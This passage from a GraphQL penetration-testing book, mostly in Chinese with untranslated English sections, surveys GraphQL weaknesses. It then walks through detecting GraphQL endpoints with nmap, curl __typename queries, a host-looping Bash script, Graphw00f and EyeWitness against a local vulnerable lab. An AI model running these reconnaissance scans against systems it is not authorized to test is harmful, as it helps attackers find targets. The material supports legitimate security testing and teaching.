  \ Matrix\n\n一旦成功验证，GraphQL 请求将被服务器执行。我们在第 1 章中介绍的解析器函数负责返回对请求字段的响应。\n\n## Common\
  \ Weaknesses\n\n在本节中，我们将对 GraphQL 中常见的弱点进行高层次概述。在后面的章节中，我们将针对每个漏洞类别进行渗透测试，并回顾相关的利用代码。\n\
  \n## Specification Rule and Implementation Weaknesses\n\nGraphQL 规范定义了规则、设计原则和标准实践。如果你想开发自己的\
  \ GraphQL 实现，这就是你的实现应遵循的文档，包括其响应格式、验证参数的方式等等。\n\n以下是从 GraphQL 规范中取出的两个规则示例：\n\n\
  - Arguments may be provided in any syntactic order and maintain identical semantic\
  \ meaning.\n- The data entry in the response will be the result of the execution\
  \ of the requested operation.\n\n\n\n\n\n这两个规则非常简单。第一条解释说，在查询中提供的参数顺序不应改变服务器的响应，第二条规则解释说\
  \ GraphQL 服务器响应必须作为数据 JSON 字段的一部分返回。\n\n然而，遵守这些规则是开发者的责任，这正是差异可能发生的地方。事实上，GraphQL\
  \ 规范并不关心实现如何符合规范：\n\n> 表达为算法的符合性要求可以通过本规范的任何实现方式来满足，只要感知到的结果是等效的。\n\n为了突出某些实现之间行为差异的示例，请看\
  \ graphql-php（https://github.com/webonyx/graphql-php）。这个开源实现用 PHP 编写，并基于 GraphQL\
  \ 的参考实现库 GraphQL.js（https://github.com/graphql/graphql-js）。\n\n然而，当你查看 graphql-php\
  \ 如何处理别名时，你会注意到它与许多其他实现不同；它允许客户端提交包含特殊字符的别名，例如 $。这些实现之间的细微差异不仅有助于黑客识别 GraphQL API\
  \ 服务背后的底层技术（正如你在第 4 章中将学到的），而且还可能允许我们制作特殊有效负载以影响使用某些实现的服务。最后，这些不同的执行行为意味着在一种实现中检测到的漏洞不一定会影响其他实现。\n\
  \n作为一名黑客，你经常会参考应用程序的设计文档，以便更好地了解它应该如何运行与实际运行方式的比较。经常，你会发现差异。例如，想象一个应用程序设计文档定义了以下规则：\n\
  \n> 应用程序必须能够从客户端接收一个 URL，通过网络获取它，并将响应返回给客户端。\n\n这条规则并不具体；它没有解释如何保护此功能以及开发人员在实现时应注意什么。然而，在从用户控制的\
  \ URL 获取内容的特性中，可能会出现许多问题。攻击者可能能够执行以下任何操作：\n\n- 在 URL 中指定私有 IP 地址（例如，10.1.1.1），这有效地允许访问应用程序所在服务器上的内部资源。\n\
  - 指定包含恶意代码的远程 URL。服务器将下载代码并在服务器上托管恶意软件。\n- 指定指向非常大文件的 URL，耗尽服务器资源并影响其他用户使用应用程序的能力。\n\
  \n这只是有害可能性的一部分列表。如果开发人员在实现过程中没有考虑到这些场景，任何使用其应用程序的人都将暴露于这些漏洞之下。\n\n构建无 bug 的软件是困难的（并且可能完全避免是不可能的）。你对应用程序了解得越多，挖掘得越深，找到漏洞的机会就越高。\n\
  \n## 拒绝服务\n\nGraphQL 中最普遍的漏洞类别之一是基于 DoS 的漏洞。这些漏洞会降低目标系统的性能或完全耗尽其资源，使其无法履行客户端查询甚至崩溃。在本章中，我们暗示了字段和对象关系、别名、指令和片段如何都可能被用作针对\
  \ GraphQL 服务的攻击向量，因为这些功能为 API 客户端提供了对查询结构和执行行为的巨大控制。\n\n在第 5 章中，你将学习这种权力如何也使客户端能够构建非常复杂的查询，如果没有适当的安全对策，这些查询有效地降低\
  \ GraphQL 服务器的性能。我们将回顾客户端创建昂贵查询的四种方式。这些可能会压倒 GraphQL 服务器并导致 DoS 条件。\n\n## 信息泄露\n\
  \n许多 Web 应用程序的常见弱点是数据意外披露给公众，或披露给未被授权访问该数据的用户组。信息泄露有许多原因，受信任保护敏感信息（如 PII）的系统应部署多层检测和预防控制，以防止信息被暴露。\n\
  \n就 GraphQL 而言，黑客可以通过多种方式对 API 进行指纹识别并收集数据。在第 6 章中，我们将教你如何利用内省查询来寻找可能包含敏感信息的字段。我们将为你提供利用字段建议和错误消息的工作原理的工具，以帮助发现隐藏的数据模型并在内省可能被禁用的\
  \ GraphQL 环境中游走。\n\n## 身份验证和授权缺陷\n\n身份验证和授权是任何 API 系统架构中的复杂安全控制。GraphQL 规范不提供实现身份验证和授权指导的事实无助于此。这种空白通常导致工程师基于开源、内部或第三方解决方案实现自己的身份验证和授权机制。\n\
  \n你在 GraphQL 中找到的大多数身份验证和授权漏洞都源于你在传统 API 中会发现的相同问题，例如未能充分防止暴力攻击、逻辑缺陷或糟糕的编码导致控制完全被绕过。在第\
  \ 7 章中，我们将回顾几种常见的 GraphQL 身份验证和授权策略，并教你如何利用别名、批量查询和老式的逻辑缺陷来击败它们。\n\n## 注入\n\n注入漏洞可能对应用程序数据造成毁灭性影响，而框架通过提供可重用的安全方法变得更擅长保护它们，但它们至今仍然普遍存在。就像其对应物\
  \ REST 和 SOAP 一样，GraphQL 并不能免疫开放 Web 应用程序安全项目（OWASP）十大风险，这是一份最常见的 Web 漏洞列表，如果应用程序接受并处理来自客户端的不受信任信息，就可能变得容易受到基于注入的攻击。\n\
  \nGraphQL 的语言支持恶意客户端向服务器发送注入数据的多种途径，例如查询参数、字段参数、指令参数和突变。GraphQL 的实现在符合 GraphQL 规范方面也各不相同，导致它们处理、清理和验证来自客户端的数据的方式存在差异。在第\
  \ 8 章中，你将了解特定的 GraphQL 注入漏洞及其进入后端系统的各种入口点。\n\n## 总结\n\n到现在为止，你应该了解 GraphQL 是什么以及其攻击向量可能是什么样子。你也应该对\
  \ GraphQL 的语言相当熟悉，在回顾了查询的解剖结构并剖析了其内部组件（如操作、字段和参数）之后。你还开始通过使用 Altair 向 DVGA 发送大量查询来利用你在第\
  \ 2 章中构建的 GraphQL 实验室。从服务器的角度来看，你被介绍了构成 GraphQL 类型系统的主要组件以及这些类型在支持 GraphQL 模式结构和内省查询方面的作用。\n\
  \n最后，我们创建了一个基地营，可以从这里发起我们未来的 GraphQL 黑客攻击。我们暗示了 GraphQL 规范中的弱点和漏洞，以及实现如何解释和扩展规范之外的不受监管功能。继续沿着这条面包屑的踪迹，继续你的\
  \ GraphQL 黑客之旅。\n\n## 4\n"
- "## 侦察\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_96_0.png)\n\n所有安全测试都始于 *侦察阶段*。在此阶段，我们尝试尽可能收集有关目标的尽可能多的信息。这些信息将帮助我们就如何攻击应用程序做出明智的决策并提高成功的机会。\n\
  \n你可能会问自己，关于 GraphQL 有什么可了解的，既然它只是一个 API 层？你将了解到，我们可以通过实验和使用专用工具，收集有关 GraphQL API\
  \ 背后运行的应用程序以及 GraphQL 实现本身的大量信息。虽然 GraphQL 查询结构在所有 GraphQL 实现中是一致的，无论它们是用什么编程语言编写的，但你可能会看到可用操作、字段、参数、指令、安全控制、对精心制作查询的响应等方面的差异。\n\
  \n\n\n\n\n以下是我们在侦察阶段应努力回答的几个关键问题：Web 服务器是否甚至拥有 GraphQL API？GraphQL 配置在哪个端点接收查询？GraphQL\
  \ 实现是用什么语言编写的？目标服务器上运行的是哪种 GraphQL 实现？该实现是否已知容易受到某些攻击？针对特定的 GraphQL 实现存在哪些类型的防御？该实现的开箱即用默认配置设置有哪些？GraphQL\
  \ 服务器是否部署了任何额外的安全保护层？能够回答这些问题将使我们能够针对目标服务器制定更集中的攻击计划并发现其防御中的漏洞。\n\n> NOTE\n> 在本章以及后续章节中，我们将使用\
  \ DVGA 作为我们的目标易受攻击应用。你应该已经在第 2 章构建的 GraphQL 安全实验室中将其运行起来。\n\n## 检测 GraphQL\n\n要在渗透测试中检测\
  \ GraphQL，首先熟悉当今野外存在的 GraphQL 服务器实现非常重要。GraphQL 存在多种用各种编程语言编写的实现，每种实现都可能具有不同的默认配置或已知弱点。表\
  \ 4-1 列出了几种 GraphQL 实现及其所使用的语言。\n\n表 4-1：GraphQL 服务器实现及其编程语言\n\n| Server implementation\
  \ | Language |\n|---|---|\n| Apollo | TypeScript |\n| Graphene | Python |\n| Yoga\
  \ | TypeScript |\n| Ariadne | Python |\n| graphql-ruby | Ruby |\n| graphql-php |\
  \ PHP |\n| graphql-go | Go |\n| graphql-java | Java |\n| Sangria | Scala |\n| Juniper\
  \ | Rust |\n| HyperGraphQL | Java |\n| Strawberry | Python |\n| Tartiflette | Python\
  \ |\n\n这些是当今使用最广泛的实现，以及更小众的实现，例如 Scala 的 Sangria、Rust 的 Juniper 和 Java 的 HyperGraphQL。稍后在本章中，我们将讨论如何在渗透测试期间区分它们。\n\
  \n检测 GraphQL API 可以通过几种方式进行：手动进行，如果网络上有超过几个主机，通常更难扩展；或自动进行，使用各种 Web 扫描器。使用 Web 扫描工具的优势在于可扩展性。它们是多线程的，并且通常能够读取外部文件作为程序输入，例如包含要扫描的主机名列表的文本文件。这些工具已内置了检测\
  \ Web 界面的逻辑，并且使用脚本语言（如 Bash 或 Python），你可以以编程方式针对数百个 IP 地址或子域运行它们。在本章中，我们将使用流行的扫描器，如\
  \ Nmap，以及 GraphQL 专用扫描工具，如 Graphw00f，进行侦察。\n\n## 常见端点\n\n在第 1 章中，我们强调了 REST 和 GraphQL\
  \ API 之间的一些差异。其中一个与侦察阶段相关的差异是，GraphQL API 端点通常是静态的，最常见的是 /graphql。\n\n然而，虽然 /graphql\
  \ 通常是默认的 GraphQL 端点，但 GraphQL 实现可以重新配置为使用完全不同的路径。在这些情况下，我们该如何检测它？一种方法是手动尝试几个常见的\
  \ GraphQL API 替代路径，例如版本化端点：\n\n+   /v1/graphql\n+   /v2/graphql\n+   /v3/graphql\n\
  \n你通常会在应用程序需要支持其 API 的多个版本时看到这些版本化 API 端点，无论是为了向后兼容，还是为了以不与客户可能仍在使用的稳定 API 版本冲突的方式引入新功能。\n\
  \n另一种找到 GraphQL 实现的方法是通过 IDE，例如 GraphQL Playground 或 GraphiQL Explorer，我们在第 1 章中使用它们来尝试\
  \ GraphQL 查询。当启用其中任一界面时，它通常会使用一个额外的专用端点。这意味着 GraphQL 也可以存在于以下端点下：\n\n+   /graphiql\n\
  +   /playground\n\n如果这些端点也恰好被版本化，它们可能在其路径前加上版本号，例如 /v1/graphiql、/v2/graphiql、/v1/playground、/v2/playground，等等。\n\
  \n清单 4-1 显示了 Graphene，一种基于 Python 的 GraphQL 实现，如何公开两个端点，一个用于 GraphQL，另一个用于内置于 Graphene\
  \ 的 GraphiQL Explorer：\n\n```\napp.add_url_rule('/graphql', view_func=GraphQLView.as_view(\n\
  \    'graphql',\n    schema=schema\n))\n\napp.add_url_rule('/graphiql', view_func=GraphQLView.as_view(\n\
  \    'graphiql',\n    schema = schema,\n    graphiql = True\n))\n```\n\n清单 4-1：Graphene\
  \ 的端点定义\n\nGraphene 将 /graphql 端点定义为其主要的 GraphQL 查询端点。然后它将 /graphiql 定义为第二个端点，GraphiQL\
  \ Explorer 将对其进行查询。最后，它启用了 GraphiQL Explorer 界面。当客户端浏览到 /graphiql 端点时，GraphQL 服务器会向客户端呈现\
  \ IDE。\n\n请记住，每个端点可能具有不同的安全设置。例如，一个可能比另一个更严格。当你在同一目标主机上找到两个提供 GraphQL 查询的端点时，你需要分别测试它们。\n\
  \nNOTE 在本书的 GitHub 仓库中，你可以找到更全面的常见 GraphQL 端点列表：https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch04/common-graphql-endpoints.txt。你可以在渗透测试或漏洞赏金狩猎期间扫描\
  \ GraphQL 服务器时将其用作 wordlist 文件。\n\n这里最重要的收获是，虽然 GraphQL 端点通常位于可预测的路径，但开发人员仍然可以自定义它以满足其需求，也许是为了将其隐藏在好奇的目光之外，或只是为了符合内部应用程序部署标准。\n\
  \n## 常见响应\n\n现在你已经了解了 GraphQL 通常从哪些端点接收查询，下一步是学习 GraphQL API 如何响应数据包。GraphQL 在网络上很容易识别。这在执行零知识渗透测试或漏洞赏金狩猎时特别有帮助。\n\
  \nGraphQL 规范描述了查询响应结构应如何格式化。这允许 API 消费者在解析 GraphQL 响应时预期预定的格式。以下摘自 GraphQL 规范的摘录描述了查询响应的外观：\n\
  \n> If the operation is a query, the result of the operation is the result of executing\
  \ the operation's top-level selection set with the query root operation type.\n\n\
  执行查询操作时可以提供初始值：\n\n```\nExecuteQuery(query, schema, variableValues, initialValue)\n\
  ```\n\n+   1. Let queryType be the root Query type in the schema.\n+   2. Assert:\
  \ queryType is an Object type.\n+   3. Let selectionSet be the top-level selection\
  \ set in the query.\n+   4. Let data be the result of running ExecuteSelectionSet(selectionSet,\
  \ queryType, initialValue, variableValues) normally (allowing parallelization).\n\
  +   5. Let errors be any field errors produced while executing the selection set.\n\
  +   6. Return an unordered map containing data and errors.\n\n在实践中，这意味着 GraphQL\
  \ API 在有结果返回给客户端查询时将返回 data JSON 字段。当客户端查询执行期间发生错误时，它还将返回 errors JSON 字段。\n\n提前知道这两条信息很有价值。简单来说，我们现在有了响应必须满足的两个条件，然后才能说它来自\
  \ GraphQL API：\n\n+   1. 有效的查询响应应始终填充 data 字段，其中包含查询响应信息。\n+   2. 无效的查询响应应始终填充 errors\
  \ 字段，其中包含出错信息。\n\n现在我们可以将这些作为扫描和检测逻辑的一部分，以自动化在网络上发现 GraphQL 服务器。所有我们需要做的就是发送一个有效或格式错误的查询并观察收到的响应。\n\
  \n让我们使用 HTTP POST 方法针对 DVGA 运行一个简单的 GraphQL 查询，以查看这些响应结构在实际中的表现。打开 Altair GraphQL\
  \ 客户端并确保地址栏设置为 http://localhost:5013/graphql 地址；然后通过在 Altair 的左侧窗格中输入以下查询来运行查询：\n\
  \n```\nquery {\n  pastes {\n    id\n  }\n}\n```\n\n接下来，点击播放按钮将查询发送到 GraphQL 服务器。这应该返回\
  \ pastes 对象的 id 字段。你应该能够看到类似于以下输出的响应：\n\n```\n\"data\": {\n  \"pastes\": [\n  {\n\
  ```\n\n\n\n\n\n```\n\"id\": \"1\"\n}\n]\n}\n```\n\n正如你所见，GraphQL 将查询响应作为 data JSON\
  \ 字段的一部分返回，正如 GraphQL 规范所述。我们得到了 pastes 对象和查询中指定的 id 字段。如果你在实验中看到返回的 id 字符串与此处显示的不同，请不要担心；这是预期的。\n\
  \n现在，让我们运行另一个查询来探索当向 GraphQL 发送无效查询时会发生什么。这将演示当查询执行期间出现问题时，GraphQL 服务器会返回 errors\
  \ JSON 字段。以下查询格式错误，GraphQL 无法处理它。在 Altair 中运行它并观察响应：\n\n```\nquery {\n  badfield\
  \ {\n    id\n  }\n}\n```\n\n请注意，我们指定了一个名为 badfield 的顶层字段。因为该字段不存在，GraphQL 服务器无法满足该查询。GraphQL\
  \ 响应如下所示：\n\n```\n{\n  \"errors\": [\n    {\n      \"message\": \"Cannot query field\
  \ \\\"badfield\\\" on type \\\"Query\\\".\",\n      \"locations\": [\n        {\n\
  \          \"line\": 2,\n          \"column\": 3\n        }\n      ]\n    },\n \
  \ ]\n}\n```\n\n正如你所见，GraphQL 服务器无法成功处理我们的查询。它返回包含 errors JSON 字段的响应。message JSON\
  \ 字段告诉我们服务器无法查询名为 badfield 的字段，因为它不存在于 GraphQL 架构中。\n\n## Nmap 扫描\n\n想象一下，你需要对包含数千台主机的网络进行渗透测试；手动逐台检查主机以找到可能提供有趣内容的主机，例如\
  \ API 或易受攻击的商业应用程序，将会相当困难。在这些情况下，渗透测试人员通常使用 Web 应用程序扫描器或自定义脚本来\n\n自动从主机抓取信息。例如，诸如\
  \ <title> HyperText Markup Language (HTML) 标签、整个 <body> 标签，甚至服务器 HTTP 响应头等信息，都可能暗示远程服务器正在运行的特定应用程序。\n\
  \n需要注意的是，Web 应用程序可能并不总是具有用户界面，这意味着它们可能不会提供与应用程序相关的任何 HTML 内容，甚至不会公开可用于检测它们的 HTTP\
  \ 头。它们通常会充当独立的 API 服务器，仅通过指定的 API 暴露数据。那么，在这些情况下我们如何检测 GraphQL 呢？幸运的是，在某些条件下，GraphQL\
  \ API 通常会返回可预测的响应，例如使用的 HTTP 方法或发送到服务器的有效负载。列表 4-2 显示了客户端发出 GET 请求时返回的常见 GraphQL\
  \ 响应。\n\n```\n# curl -X GET http://localhost:5013/graphql\n\n{\"errors\":[{\"message\"\
  :\"Must provide query string.\"}]}\n```\n\n列表 4-2：对 HTTP GET 请求的 GraphQL 响应\n\n\
  字符串 Must provide query string 通常用于 GraphQL 实现中，例如基于 Python 和 Node.js 的实现。（请记住，基于\
  \ GET 的查询通常不被 GraphQL 服务器支持。放心：即使遇到这种情况，我们也有许多其他方法来检测 GraphQL。）\n\n有了这些信息，我们现在有能力自动化扫描并发现网络上可能存在的其他\
  \ GraphQL 服务器。列表 4-3 显示了如何使用 Nmap 来实现这一点，使用 http-grep NSE 脚本，该脚本使用模式匹配在给定的网页中查找关键字。\n\
  \n```\n# nmap -p 5013 -sV --script=http-grep\n--script-args='match=\"Must provide\
  \ query string\", ① http-grep.url=\"/graphql\"' localhost ②\n\nPORT     STATE SERVICE\
  \ VERSION\n5013/tcp open  http    Werkzeug httpd\n| http-grep:\n|   (1) http://localhost:5013/graphql:\n\
  |   (1) User Pattern 1:\n|     + Must provide query string\n```\n\n列表 4-3：使用 Nmap\
  \ 的 http-grep 进行单词匹配的 GraphQL 响应\n\n在 ① 处，我们为 http-grep 指定了一个名为 match 的脚本参数，其值为\
  \ Must provide query string（我们在 GraphQL 响应中收到的消息）。在 ② 处，我们定义了另一个名为 http-grep.url\
  \ 的参数，其值为 /graphql，这指示 Nmap 在 Web 应用程序内的特定页面中进行搜索。在内部，Nmap 将向 localhost 发出 HTTP\
  \ GET 请求，并使用我们定义的参数字符串值作为其在从 Web 服务器响应中提取的文本中搜索的模式。在其输出中，Nmap 显示在网页上找到了模式，并指示它找到匹配的字符串。\n\
  \n你可能已经注意到，我们正在向 Nmap 传递一个特定端口 (-p)——即端口 5013。与任何 Web 服务器一样，GraphQL 服务器可以在任何端口上运行，但有一些端口相当常见，例如\
  \ 80–89、443、4000–4005、8443、8000 和 8080。我们建议在可能的情况下扫描常用和不常用的端口范围。\n\n## __typename\
  \ 字段\n\n到目前为止，我们确切地知道在查询中请求哪些字段，例如 pastes 及其 id 的选择集，正如我们之前请求的那样。你可能会想，如果我们不知道 GraphQL\
  \ API 上存在哪些字段怎么办？没有这些信息我们如何识别 GraphQL 呢？幸运的是，有一种快速的方法可以查询 GraphQL 并在不知道应用程序架构的任何信息的情况下返回有效响应。\n\
  \n元字段是 GraphQL API 向客户端公开的内置字段。一个例子是 __schema（GraphQL 中内省的一部分）。另一个元字段的例子是 __typename。使用时，它会返回正在查询的对象类型的名称。列表\
  \ 4-4 显示了使用此元字段的查询。\n\n```\nquery {\n  pastes {\n    __typename\n  }\n}\n```\n\n\
  列表 4-4：带有 __typename 元字段的 GraphQL 查询\n\n当你使用 Altair 运行此查询时，响应将是 pastes 对象类型的名称：\n\
  \n```\n\"data\": {\n  \"pastes\": [\n    {\n      \"__typename\": \"PasteObject\"\
  \n    }\n  ]\n}\n```\n\n正如你所见，GraphQL 告诉我们 pastes 对象的类型名称是 PasteObject。这里的真正技巧是\
  \ __typename 元字段也可以用于查询根类型，如列表 4-5 所示。\n\n```\nquery {\n  __typename\n}\n```\n\n\
  列表 4-5：使用查询根类型的 GraphQL 元字段\n\n此查询使用 __typename 来描述查询根类型，并且可以适用于几乎任何 GraphQL 实现，因为\
  \ __typename 是官方规范的一部分。\n\n当你尝试从命令行查询 GraphQL 时，GraphQL 服务器期望一定的请求结构。对于基于 HTTP GET\
  \ 的查询，请求应具有以下 HTTP 查询参数：\n\n- query 用于 GraphQL 查询（必填参数）。\n- operationName 用于操作名称，当单个文档中发送多个查询时使用。此参数告诉\
  \ GraphQL 服务器在存在多个操作时运行哪个特定操作（可选参数）。\n- variables 用于查询变量（可选参数）。\n\n对于基于 HTTP POST\
  \ 的查询，相同的参数应以 JSON 形式传递在 HTTP 主体中。\n\n当 GraphQL 服务器接受使用 GET 的查询时，你可以使用简写语法传递 query\
  \ 参数以及 GraphQL 查询（在这种情况下，查询为 {__typename}）。有了这个想法，我们可以相当轻松地使用 Nmap 来自动化 GraphQL\
  \ 的检测。列表 4-6 显示了如何使用 Nmap 运行 __typename 查询。\n\n```\n# nmap -p 5013 -sV --script=http-grep\
  \ --script-args='match=\"__typename\", http-grep.url=\"/graphql?query={__typename}\"\
  ' localhost\n\nPORT      STATE SERVICE VERSION\n5013/tcp open  http    Werkzeug\
  \ httpd\n| http-grep:\n|   (1) http://localhost:5013/graphql?query={__typename}:\n\
  |     (1) User Pattern 1:\n|_        + __typename\n```\n\n列表 4-6：使用 Nmap 的基于 GET\
  \ 的查询检测 GraphQL\n\n在此示例中，Nmap 脚本 http-grep 在内部使用 GET 方法来完成其工作。\n\n如果要扫描的主机不止少数几台，你可能希望利用\
  \ Nmap 的 -iL 标志指向包含主机名列表的文件，如列表 4-7 所示。\n\n```\n# nmap -p 5013 -iL hosts.txt -sV\
  \ --script=http-grep --script-args='match=\"__typename\", http-grep.url=\"/graphql?query={__typename}\"\
  '\n```\n\n列表 4-7：使用 Nmap 扫描文件中定义的多個目标\n\n此示例中的 hosts.txt 文件将包含分别列在不同行上的 IP 地址或域名系统\
  \ (DNS) 主机名。\n\n如果 GraphQL 服务器不支持基于 GET 的查询，我们可以使用 cURL 和 __typename 字段发出 POST 请求来检测\
  \ GraphQL，如列表 4-8 所示。\n\n```\n# curl -X POST http://localhost:5013/graphql -d '{\"\
  query\":\"{__typename }\"}' -H \"Content-Type: application/json\"\n```\n\n列表 4-8：使用\
  \ cURL 发送基于 POST 的查询\n\n\n\n\n\nTo use this detection method against a list of hosts,\
  \ you can use Bash scripting, as shown in Listing 4-9.\n\n```\n# for host in $(cat\
  \ hosts.txt); do\n    curl -X POST \"$host\" -d '{\"query\":\"{__typename }\"}'\
  \ -H \"Content-Type: application/json\"\ndone\n```\n\nListing 4-9: A Bash script\
  \ to automate a POST-based GraphQL detection using cURL\n\nThe hosts.txt file in\
  \ this example would contain a list of full target URLs on separate lines (including\
  \ their protocol schemes, domains, ports, and endpoints).\n\n## Graphw00f\n\nIn\
  \ Chapter 2, we briefly discussed Graphw00f, a GraphQL tool based on Python for\
  \ detecting GraphQL and performing implementation-level fingerprinting. In this\
  \ section, we will use it to detect DVGA in our lab, walking you through how it\
  \ does its detection magic.\n\nWe mentioned earlier in this chapter that GraphQL\
  \ servers are found at the endpoint /graphql by default. When this is not the case,\
  \ we might need an automated way to iterate through known endpoints in order to\
  \ figure out where queries are served from. Graphw00f allows you to specify a custom\
  \ list of endpoints when running a scan. If you don’t provide a list, Graphw00f\
  \ will use its hardcoded list of common endpoints whenever it is tasked with detecting\
  \ GraphQL, as shown in Listing 4-10.\n\n```\ndef possible_graphql_paths():\n   \
  \ return [\n        '/graphql',\n        --snip--\n        '/console',\n       \
  \ '/playground',\n        '/gql',\n        '/query',\n        --snip--\n    ]\n\
  ```\n\nListing 4-10: A list of common GraphQL endpoints in Graphw00f's source code\n\
  \nTo see Graphw00f in action, open your terminal and execute the command in Listing\
  \ 4-11. We use command line parameters -t (target) and -d (detection). The -t flag\
  \ in this case will be the remote URL http://localhost:5013, and the -d flag will\
  \ turn on detection mode, which indicates to Graphw00f that it should run a GraphQL\
  \ detection check against the target URL. If you have questions about Graphw00f's\
  \ arguments, use the -h flag to read more about its options.\n\n```\n# cd ~/graphw00f\n\
  # python3 main.py -d -t http://localhost:5013\n```\n\ngraphw00f\nThe fingerprinting\
  \ tool for GraphQL\n\n```\n[*] Checking http://localhost:5013/\n[*] Checking http://localhost:5013/graphql\n\
  [!] Found GraphQL at http://localhost:5013/graphql\n```\n\n### Listing 4-11: A GraphQL\
  \ detection with Graphw00f\n\nRun in detect mode, Graphw00f iterates through various\
  \ web paths. It checks for the existence of GraphQL in the main web root folder\
  \ and the /graphql folder. Then it signals to us that it found GraphQL under /graphql\
  \ based on the HTTP response heuristics we discussed earlier.\n\nTo use your own\
  \ list of endpoints, you can pass the -w (wordlist) flag and point it at a file\
  \ containing your endpoints, as shown in Listing 4-12.\n\n```\n# cat wordlist.txt\n\
  \n/app/graphql\n/dev/graphql\n/v5/graphql\n\n# python3 main.py -d -t http://localhost:5013\
  \ -w wordlist.txt\n\n[*] Checking http://localhost:5013/app/graphql\n[*] Checking\
  \ http://localhost:5013/dev/graphql\n[*] Checking http://localhost:5013/v5/graphql\n\
  ```\n\n### Listing 4-12: Using a custom endpoint list with Graphw00f\n\n## Detecting\
  \ GraphiQL Explorer and GraphQL Playground\n\nThe GraphiQL Explorer and GraphQL\
  \ Playground IDEs are built using the JavaScript library React. Yet when performing\
  \ reconnaissance, we will often rely on tools that are incapable of rendering web\
  \ pages containing JavaScript, such as command line HTTP clients like cURL or web\
  \ application scanners like Nikto. In the process, we might miss interesting web\
  \ interfaces.\n\nIn general, you’ll find it beneficial to look for any signs of\
  \ web interfaces available on the network, such as administration, debugging, or\
  \ configuration panels, all of which are great candidates to hack. These panels\
  \ tend to be data rich and often become a way to pivot to other networks or to escalate\
  \ privileges. They also tend to be far less hardened than publicly facing applications.\
  \ Companies assume that the external space (the internet) is riskier than the internal\
  \ space (the corporate network). As such, they often have guidelines for securing\
  \ publicly facing servers and applications via aggressive patching policies, configuration\
  \ reviews, and frequent vulnerability scanning. Unfortunately, internal applications\
  \ rarely get the same treatment, which often makes them an easier target for hackers.\n\
  \nAn interesting and often overlooked technique to scan for graphical web interfaces\
  \ is through the use of tools such as headless browsers. Headless browsers are fully\
  \ functional command line web browsers that the user can program for a variety of\
  \ purposes, such as retrieving page contents, submitting forms, or simulating real\
  \ user behavior on a web page. For example, the headless browsers Selenium and PhantomJS\
  \ can be handy when you need to render web pages containing JavaScript code.\n\n\
  One security tool in particular has incorporated a headless browser to solve this\
  \ gap: EyeWitness. This web scanner is capable of taking screenshots of web pages\
  \ by leveraging the Selenium headless browser driver engine behind the scenes. EyeWitness\
  \ then generates a nice report, along with a screen capture of the page.\n\n## Scanning\
  \ for Graphical Interfaces with EyeWitness\n\nSince the two GraphQL IDEs use JavaScript\
  \ code, we need a capable scanner to help us identify them when we perform network-wide\
  \ scans. Let’s use EyeWitness to identify these graphical interfaces.\n\nEyeWitness\
  \ offers many options for customizing its scanner behavior, and you can see them\
  \ by running the tool with the -h option. To detect GraphQL IDE panels, we’ll use\
  \ the --web option, which will attempt a screen capture of the scanned site with\
  \ the headless browser engine, together with the --single option, which is suitable\
  \ when you need to scan only a single target URL. We will then use the -d flag to\
  \ indicate to EyeWitness the folder in which it should dump the report (in this\
  \ case, the dvga-report folder). Listing 4-13 puts everything together.\n\n```\n\
  # eyewitness --web --single http://localhost:5013/graphql -d dvga-report\n\nAttempting\
  \ to screenshot http://localhost:5013/graphql\n\n[*] Done! Report written in the\
  \ dvga-report folder!\nWould you like to open the report now? [Y/n]\n```\n\nListing\
  \ 4-13: The runtime output of EyeWitness\n\nIn the output, EyeWitness indicates\
  \ that it saved the collected web page source files in the dvga-report folder and\
  \ asks us whether to open the report. Press Y and ENTER to open a web browser displaying\
  \ the HTML report, including the screenshot it took during the scan. Figure 4-1\
  \ shows the report.\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_107_0.png)\n\nFigure\
  \ 4-1: An HTML report produced by EyeWitness\n\nAdditionally, the dvga-report will\
  \ contain several folders, as shown here:\n\n```\n# ls -l dvga-report/\ntotal 112\n\
  -rw-r--r-- 1 kali kali 95957 Dec 15 15:19 jquery.min.js\n-rw-r--r-- 1 kali kali\
  \ 2356 Feb 11 15:10 report.html\ndrwxr-xr-x 2 kali kali 4096 Feb 11 15:09 screens\n\
  drwxr-xr-x 2 kali kali 4096 Feb 11 15:09 source\n-rw-r--r-- 1 kali kali 684 Feb\
  \ 11 15:09 style.css\n```\n\nThe report.html file includes information about the\
  \ target, such as the HTTP response headers it sent back to the client, a screen\
  \ capture of the application running on the target, and a link to the web page’s\
  \ source code. While you can visually identify the GraphiQL IDE by using the screen\
  \ capture taken by EyeWitness, you can also confirm your finding by searching the\
  \ source folder, where the source code files reside. Run the command shown in Listing\
  \ 4-14 to search for any GraphiQL Explorer or GraphQL Playground strings within\
  \ the source code.\n\n```\n# grep -Hnio \"graphiql|graphql-playground\" dvga-report/source/*\n\
  source/http.localhost.5013.graphiql.txt:18:graphiql\nsource/http.localhost.5013.graphiql.txt:18:graphiql\n\
  source/http.localhost.5013.graphiql.txt:18:graphiql\n```\n\nListing 4-14: Keyword\
  \ matches in the web page source code\n\nLet’s break down the command to explain\
  \ what’s happening here. We run a case-insensitive search using grep by passing\
  \ it the i flag to find any instances of the words graphql or graphql-playground\
  \ in the source folder. Using the -H flag, we tell grep to print the names of files\
  \ containing any pattern matches. The -n flag indicates the line number at which\
  \ the match is located (in this case, 18). The -o flag prints only the parts of\
  \ matching lines that yielded positive results. As you can see, the search found\
  \ multiple instances of the string graphiql at line number 18.\n\nEyeWitness can\
  \ run the same type of scan against a list of URLs, as opposed to a single URL,\
  \ using the -f (file) flag. When you use this flag, EyeWitness will expect a text\
  \ file containing a list of target URLs to scan. Listing 4-15 shows how to write\
  \ a single URL (http://localhost:5013/graphiql) to a text file (urls.txt) and pass\
  \ it on to EyeWitness as its custom URL list.\n\n```\n# echo 'http://localhost:5013/graphiql'\
  \ > urls.txt\n# eyewitness --web -f urls.txt -d dvga-report\n\nStarting Web Requests\
  \ (1 Hosts)\nAttempting to screenshot http://localhost:5013/graphiql\nFinished in\
  \ 8 seconds\n\n[*] Done! Report written in the dvga-report folder!\n```\n\nListing\
  \ 4-15: Scanning multiple URLs with EyeWitness\n\n\n\n\n\nEyeWitness 会遍历文件中指定的 URL，对其进行扫描，并将输出保存到\
  \ dvwa-report 文件夹中以供进一步检查。\n\n在本示例中，我们使用的是只包含单个 URL 的文件。通常，你可能希望在 /graphql 端点之外搜索其他\
  \ Web 路径，以检查 GraphQL 是否位于其他位置，特别是较为隐蔽的位置。你可以通过多种方式创建用于 EyeWitness 的 URL 列表。第一个选项是使用“第\
